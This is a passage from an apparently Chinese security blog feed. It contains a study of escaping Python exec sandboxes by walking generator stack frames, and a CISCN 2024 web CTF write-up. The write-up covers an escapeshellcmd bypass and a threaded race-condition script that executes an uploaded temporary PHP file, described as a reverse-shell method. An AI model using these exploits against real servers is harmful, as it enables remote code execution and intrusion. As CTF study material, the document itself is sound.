href="https://www.less-bug.com/posts/pratt-parsing-introduction-and-implementation-in-typescript/">https://www.less-bug.com/posts/pratt-parsing-introduction-and-implementation-in-typescript/</a></p><p>​</p>]]></content>
      
      
      
        <tags>
            
            <tag> Compilers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python栈帧进行逃逸的探究</title>
      <link href="/2024/05/22/WebExploit/Python/frame_pyjail/"/>
      <url>/2024/05/22/WebExploit/Python/frame_pyjail/</url>
      
        <content type="html"><![CDATA[<h1 id="一次使用python栈帧进行逃逸的demo探究"><a href="#一次使用python栈帧进行逃逸的demo探究" class="headerlink" title="一次使用python栈帧进行逃逸的demo探究"></a>一次使用python栈帧进行逃逸的demo探究</h1><h2 id="起"><a href="#起" class="headerlink" title="起"></a>起</h2><blockquote><p>为什么会有这篇文章？</p></blockquote><p>起初，我在讨论群里发起讨论，起初我只是不太理解这个demo为什么不能逃逸（即为什么<code>f_back</code>后为<code>None</code>）</p><p>可惜群友们也不太清楚诶&#x2F;(ㄒoㄒ)&#x2F;~~</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406011940858.png" alt="image-20240601193716401"></p><p>于是打算研究下。</p><p>后面把demo完善，也就抽象出来了这个问题：<strong>使用栈帧逃逸的本质是什么？</strong></p><h2 id="承"><a href="#承" class="headerlink" title="承"></a>承</h2><p>我把最终的demo设计成这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line">codes = <span class="string">&#x27;&#x27;&#x27;import pdb</span></span><br><span class="line"><span class="string"># 生成器函数</span></span><br><span class="line"><span class="string">def f():</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        print(&quot;g.gi_frame in f:&quot;, g.gi_frame)       </span></span><br><span class="line"><span class="string">        print(&quot;g.gi_frame.f_back in f:&quot;, g.gi_frame.f_back)</span></span><br><span class="line"><span class="string">        print(&quot;g.gi_frame.f_back.f_back in f:&quot;, g.gi_frame.f_back.f_back)</span></span><br><span class="line"><span class="string">        # pdb.set_trace()</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f()                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">frame = next(g)             </span></span><br><span class="line"><span class="string">next(g)</span></span><br><span class="line"><span class="string">next(g)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">frame2 = g.gi_frame         </span></span><br><span class="line"><span class="string"># pdb.set_trace()</span></span><br><span class="line"><span class="string">print(frame2)</span></span><br><span class="line"><span class="string">print(frame2.f_back)      # None</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span> = &#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes,<span class="string">&quot;test2&quot;</span>,<span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code, <span class="built_in">locals</span>)</span><br></pre></td></tr></table></figure><p>​尝试执行后的结果下图。</p><p>​可以发现三次<code>next</code>后结果大差不差，区别就在<code>g.gi_frame.f_back</code>中的行号：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406011943425.png" alt="image-20240601194247087"></p><p>​</p><p>​仔细比对，可以发现刚好对应的就是三次<code>next</code>在<code>codes</code>中的行号，这就是在不同位置调用生成器函数<code>f</code>时，在生成器函数<code>f</code>中<code>gi_frame.f_back</code>的对应栈帧在不同位置，同时我们注意到一个细节<code>print(&quot;g.gi_frame in f:&quot;, g.gi_frame) </code>和<code>print(frame2)</code>的打印结果不同，但是它们确实是同一个对象（<code>print(is)</code>进行确认）</p><h2 id="转"><a href="#转" class="headerlink" title="转"></a>转</h2><p>这里也就要开始涉及python虚拟机底层的知识了</p><ul><li>首先是栈帧的数据结构</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">frame</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">frame</span> *<span class="title">f_back</span>;</span>      <span class="comment">/* previous frame, or NULL */</span></span><br><span class="line">    PyCodeObject *f_code;       <span class="comment">/* code segment */</span></span><br><span class="line">    PyObject *f_builtins;       <span class="comment">/* builtin symbol table (PyDictObject) */</span></span><br><span class="line">    PyObject *f_globals;        <span class="comment">/* global symbol table (PyDictObject) */</span></span><br><span class="line">    PyObject *f_locals;         <span class="comment">/* local symbol table (any mapping) */</span></span><br><span class="line">    PyObject **f_valuestack;    <span class="comment">/* points after the last local */</span></span><br><span class="line">    <span class="comment">/* Next free slot in f_valuestack.  Frame creation sets to f_valuestack.</span></span><br><span class="line"><span class="comment">       Frame evaluation usually NULLs it, but a frame that yields sets it</span></span><br><span class="line"><span class="comment">       to the current stack top. */</span></span><br><span class="line">    PyObject **f_stacktop;</span><br><span class="line">    PyObject *f_trace;          <span class="comment">/* Trace function */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* In a generator, we need to be able to swap between the exception</span></span><br><span class="line"><span class="comment">       state inside the generator and the exception state of the calling</span></span><br><span class="line"><span class="comment">       frame (which shouldn&#x27;t be impacted when the generator &quot;yields&quot;</span></span><br><span class="line"><span class="comment">       from an except handler).</span></span><br><span class="line"><span class="comment">       These three fields exist exactly for that, and are unused for</span></span><br><span class="line"><span class="comment">       non-generator frames. See the save_exc_state and swap_exc_state</span></span><br><span class="line"><span class="comment">       functions in ceval.c for details of their use. */</span></span><br><span class="line">    PyObject *f_exc_type, *f_exc_value, *f_exc_traceback;</span><br><span class="line">    <span class="comment">/* Borrowed reference to a generator, or NULL */</span></span><br><span class="line">    PyObject *f_gen;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> f_lasti;                <span class="comment">/* Last instruction if called */</span></span><br><span class="line">    <span class="comment">/* Call PyFrame_GetLineNumber() instead of reading this field</span></span><br><span class="line"><span class="comment">       directly.  As of 2.3 f_lineno is only valid when tracing is</span></span><br><span class="line"><span class="comment">       active (i.e. when f_trace is set).  At other times we use</span></span><br><span class="line"><span class="comment">       PyCode_Addr2Line to calculate the line from the current</span></span><br><span class="line"><span class="comment">       bytecode index. */</span></span><br><span class="line">    <span class="type">int</span> f_lineno;               <span class="comment">/* Current line number */</span></span><br><span class="line">    <span class="type">int</span> f_iblock;               <span class="comment">/* index in f_blockstack */</span></span><br><span class="line">    <span class="type">char</span> f_executing;           <span class="comment">/* whether the frame is still executing */</span></span><br><span class="line">    PyTryBlock f_blockstack[CO_MAXBLOCKS]; <span class="comment">/* for try and loop blocks */</span></span><br><span class="line">    PyObject *f_localsplus[<span class="number">1</span>];  <span class="comment">/* locals+stack, dynamically sized */</span></span><br><span class="line">&#125; PyFrameObject;</span><br></pre></td></tr></table></figure><ul><li>栈帧的创建和销毁</li></ul><p>​栈帧的创建和销毁是动态的，随着函数的调用和返回而不断发生。当一个函数被调用时，一个新的栈帧会被创建并推入调用栈，当函数调用结束后，对应的栈帧会从调用栈中弹出并销毁</p><ul><li>函数调用栈</li></ul><p><code>f_back</code>串起了栈帧列表：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406012040006.png" alt="img"></p><h2 id="合"><a href="#合" class="headerlink" title="合"></a>合</h2><p>其实到这里也渐渐明晰了</p><blockquote><p>在 Python 中，一个栈帧的 <code>f_back</code> 属性指向调用它的栈帧。<strong>对于在模块（全局）级别执行的代码，其所在的栈帧的 <code>f_back</code> 通常是 <code>None</code>，因为这些代码并没有被另一个函数或方法调用，实际上，它们是在模块的顶级或全局作用域内执行的</strong>。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line">codes = <span class="string">&#x27;&#x27;&#x27;import pdb</span></span><br><span class="line"><span class="string"># 生成器函数</span></span><br><span class="line"><span class="string">def f():</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        print(&quot;g.gi_frame in f:&quot;, g.gi_frame)       </span></span><br><span class="line"><span class="string">        print(&quot;g.gi_frame.f_back in f:&quot;, g.gi_frame.f_back)</span></span><br><span class="line"><span class="string">        print(&quot;g.gi_frame.f_back.f_back in f:&quot;, g.gi_frame.f_back.f_back)</span></span><br><span class="line"><span class="string">        # pdb.set_trace()</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f()                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">frame = next(g)             </span></span><br><span class="line"><span class="string">next(g)</span></span><br><span class="line"><span class="string">next(g)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">frame2 = g.gi_frame         </span></span><br><span class="line"><span class="string"># pdb.set_trace()</span></span><br><span class="line"><span class="string">print(frame2)</span></span><br><span class="line"><span class="string">print(frame2.f_back)      # None</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span> = &#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes,<span class="string">&quot;test2&quot;</span>,<span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code, <span class="built_in">locals</span>)</span><br></pre></td></tr></table></figure><p>（先后解开代码中的两处pdb注释可得如下结果）</p><ul><li>函数外</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406012040981.png" alt="image-20240601202724116"></p><p>直接在全局下使用<code>g.gi_frame</code>获取到的栈帧对象，是直接指向<code>&lt;model&gt;</code>全局的，回退之后为<code>None</code>（对于在模块（全局）级别执行的代码，其所在的栈帧的 <code>f_back</code> 通常是 <code>None</code>）</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406012040244.png" alt="image-20240601202909134"></p><ul><li><p>函数内的栈帧分析</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406012040598.png" alt="image-20240601202643113"></p></li></ul><p>​能从<code>f()</code>栈帧回退拿到<code>codes</code>所在的”全局”栈帧，再回退就能拿到<code>exec</code>所在的栈帧了，此为逃逸</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406012040767.png" alt="image-20240601203606382"></p><ul><li>回过头来，再回答开头这个问题：<strong>使用栈帧逃逸的本质是什么？</strong>或者说我们需要拿到什么？</li></ul><blockquote><p>可以发现，我们应该要拿到调用栈上的一个<strong>函数的栈帧</strong></p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/Chang-LeHung/p/17351403.html">https://www.cnblogs.com/Chang-LeHung/p/17351403.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WebSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-CISCN初赛-Web-复现</title>
      <link href="/2024/05/21/WriteUp/2024-CISCN-Review/"/>
      <url>/2024/05/21/WriteUp/2024-CISCN-Review/</url>
      
        <content type="html"><![CDATA[<h1 id="2024-CISCN初赛-Web-复现"><a href="#2024-CISCN初赛-Web-复现" class="headerlink" title="2024-CISCN初赛-Web-复现"></a>2024-CISCN初赛-Web-复现</h1><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple-php"></a>simple-php</h2><h3 id="绕过的打法"><a href="#绕过的打法" class="headerlink" title="绕过的打法"></a>绕过的打法</h3><p>哎比赛的时候还是太懒了，没有去尝试写脚本发包。这里有个坑，我直接在hackbar或者yakit里添加换行符可能会因为奇奇怪怪的编码问题到后端还是解析失败。</p><p>赛后复现尝试使用脚本发包成功了，这里主要是一个<code>escapeshellcmd</code>函数，</p><p>在LIinux下在碰到如下字符时会添加<code>\</code>，windows下会添加<code>^</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#;|*?~&lt;&gt;^()[]&#123;&#125;$\  \x0A \xFF</span><br></pre></td></tr></table></figure><p>但是我们在Linux下有如下特性</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405311447208.png" alt="image-20240521133132757"></p><p>那么也就可以通过这个来进行<code>system($_POST[&#39;cmd&#39;])</code>了，最后flag在数据库中</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405311447851.png" alt="image-20240521133349519"></p><p>一些新鲜的linux指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">du读磁盘的信息，顺便给了目录信息</span><br><span class="line">pastepaste 命令用于合并文件的列，并显示文件内容</span><br><span class="line">rev倒序打印文件内容</span><br></pre></td></tr></table></figure><h3 id="条件竞争打临时文件"><a href="#条件竞争打临时文件" class="headerlink" title="条件竞争打临时文件"></a>条件竞争打临时文件</h3><p>条件竞争打临时文件，php反弹shell</p><p>这是看了<a href="https://jbnrz.com.cn/%E5%B8%88%E5%82%85%E7%9A%84wp%EF%BC%8C%E6%89%8D%E6%84%8F%E8%AF%86%E5%88%B0%E6%9C%89%E8%BF%99%E7%A7%8D%E6%89%93%E6%B3%95%EF%BC%8Ctql">https://jbnrz.com.cn/师傅的wp，才意识到有这种打法，tql</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;url&quot;</span></span><br><span class="line"> </span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upoadFile</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;files&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;e.php&quot;</span>)&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;du -a /&quot;</span>&#125;</span><br><span class="line">    res = requests.post(url, files=file, data=data)</span><br><span class="line">    r = re.findall(<span class="string">&quot;(/tmp/php.*)&quot;</span>, res.text)</span><br><span class="line">    <span class="comment"># print(r)</span></span><br><span class="line">    <span class="keyword">if</span> r <span class="keyword">and</span> r[<span class="number">0</span>] != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> r[<span class="number">0</span>] != <span class="string">&#x27;/tmp/php&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;php &quot;</span> + r[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">&quot;php &quot;</span> + r[<span class="number">0</span>])</span><br><span class="line">    <span class="comment"># print(res.text)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPhp</span>():</span><br><span class="line">    </span><br><span class="line">    data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;du -lh --max-depth=1 -a /tmp&quot;</span>&#125;</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    r = re.findall(<span class="string">&quot;(/tmp/php.*)&quot;</span>, res.text)</span><br><span class="line">    <span class="comment"># print(r)</span></span><br><span class="line">    <span class="keyword">if</span> r <span class="keyword">and</span> r[<span class="number">0</span>] != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> r[<span class="number">0</span>] != <span class="string">&#x27;/tmp/php&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;php &quot;</span> + r[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">&quot;php &quot;</span> + r[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>(<span class="params">cmd</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;cmd&quot;</span>: cmd&#125;</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        threading.Thread(target=getPhp).start()</span><br><span class="line">        threading.Thread(target=upoadFile).start()</span><br></pre></td></tr></table></figure><h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><p>考点就是利用生成器栈帧进行逃逸</p><p>主要参考：</p><ol><li><a href="https://xz.aliyun.com/t/12647?time__1311=mqmhDvqIrrGNDQtiQGkIDkW5D=eQ9G4mD&alichlgref=https://www.google.com/#toc-44">https://xz.aliyun.com/t/12647?time__1311=mqmhDvqIrrGNDQtiQGkIDkW5D%3DeQ9G4mD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-44</a></li><li><a href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG=dSMOkdxWD&alichlgref=https://www.bing.com/">https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3DdSMOkdxWD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</a></li></ol><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><blockquote><p>Python生成器：Python中的一种特殊的迭代器，它可以通过简单的函数和表达式进行创建。</p><p>特点：可以逐个产生值，并且在每次生成值后保留当前状态，以便下一次调用继续生成值</p><p><code>python</code>中生成器使用<code>yield</code>关键字来定义，<code>yield</code>用来产生一个值，并在保留当前状态的同时暂停函数的执行</p><p>当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个<code>yield</code>语句或函数结束</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405311946709.png" alt="image-20240531151741212"></p><ul><li>生成器表达式</li></ul><blockquote><p>创建生成器的紧凑形式，类似于列表推导式（但不是）</p><p>注意使用是圆括号而不是方括号 </p></blockquote><p>​我们可以使用<code>in</code>关键字去访问一个生成器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=(i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405311946529.png" alt="image-20240531152117720"></p><ul><li>生成器的属性</li></ul><p><code>gi_code</code>：生成器对应的<code>code</code>对象</p><p><code>gi_frame</code>：生成器对应的<code>frame</code>对象</p><p><code>gi_running</code>：生成器函数是否在执行，生成器函数在<code>yield</code>以后，执行<code>yield</code>的下一行代码前处于<code>frozen</code>状态，此时该字段为0</p><p><code>gi_yieldrom</code>：如果生成器正在从另一个生成器中<code>yield</code>值，则在该生成器对象的引用，否则为None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b += <span class="number">2</span></span><br><span class="line">f = f()</span><br><span class="line">frame = f.gi_frame</span><br><span class="line"><span class="built_in">next</span>(f)</span><br><span class="line"><span class="built_in">print</span>(frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(frame.f_lasti)</span><br><span class="line"><span class="built_in">print</span>(frame.f_builtins)</span><br><span class="line"><span class="built_in">next</span>(f)</span><br><span class="line"><span class="built_in">next</span>(f)</span><br></pre></td></tr></table></figure><p><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性，帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p><p>其拥有的字段如下：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405311946252.png" alt="image-20240531155249936"></p><p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。<strong>每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈</strong>。</p><p>栈帧包含了以下几个重要的属性：<br><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈</p><h3 id="使用栈帧实现沙箱逃逸"><a href="#使用栈帧实现沙箱逃逸" class="headerlink" title="使用栈帧实现沙箱逃逸"></a>使用栈帧实现沙箱逃逸</h3><h4 id="一个小插曲"><a href="#一个小插曲" class="headerlink" title="一个小插曲"></a>一个小插曲</h4><p>一个简单的demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="comment"># yield 1</span></span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------start------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pdb.set_trace()</span></span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"><span class="built_in">print</span>(frame.f_back)</span><br><span class="line"><span class="built_in">print</span>(frame.f_back.f_back)</span><br><span class="line"><span class="built_in">print</span>(frame.f_back.f_back.f_back)</span><br><span class="line"><span class="built_in">print</span>(frame.f_back.f_back.f_back.f_back)</span><br><span class="line"><span class="built_in">print</span>(frame.f_back.f_back.f_back.f_back.f_back)</span><br><span class="line"><span class="built_in">print</span>(frame.f_back.f_back.f_back.f_back.f_back.f_back)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------end------------------&quot;</span>)</span><br></pre></td></tr></table></figure><p>直接运行：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405312043207.png" alt="image-20240531204124941"></p><p>但是，这段代码使用IDE调试是不会报错的，因为它使用的是pydev调试器启动文件，相当于调用栈中先执行pydev内部程序，在执行exp.py，所以在<code>f_back</code>回退栈帧时是有得回退的</p><p>(参考：<a href="https://pypi.org/project/pydevd/">https://pypi.org/project/pydevd/</a>)</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405312043417.png" alt="image-20240531204153741"></p><p>所以最为保险的方案是使用<code>PDB</code>，用起来很像<code>GDB</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405312045074.png" alt="image-20240531204531450"></p><h4 id="逃逸demo"><a href="#逃逸demo" class="headerlink" title="逃逸demo"></a>逃逸demo</h4><p><strong>最核心的点是：你在jail中构造的栈帧能够嵌入到整个程序的调用栈中，这样<code>f_back</code>回滚栈帧的时候才能回到主程序中</strong></p><p>总之就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compile</span>(<span class="params">source: <span class="built_in">str</span> | <span class="built_in">bytes</span> | mod | AST,</span></span><br><span class="line"><span class="params">            filename: <span class="built_in">str</span> | <span class="built_in">bytes</span> | _PathLike,</span></span><br><span class="line"><span class="params">            mode: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">            flags: <span class="built_in">int</span> = ...,</span></span><br><span class="line"><span class="params">            dont_inherit: <span class="built_in">int</span> = ...,</span></span><br><span class="line"><span class="params">            optimize: <span class="built_in">int</span> = ...</span>) -&gt; <span class="type">Any</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">demo.py: compile</span><br><span class="line">--&gt; filename: &lt;module&gt;</span><br><span class="line">--&gt; ...</span><br></pre></td></tr></table></figure><ul><li>demo1</li></ul><p>调用栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp.py: <span class="built_in">compile</span>&lt;= frame.f_back</span><br><span class="line">--&gt; test: &lt;module&gt; &lt;= (frame=g.gi_frame.f_back)</span><br><span class="line">    --&gt; test: f()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 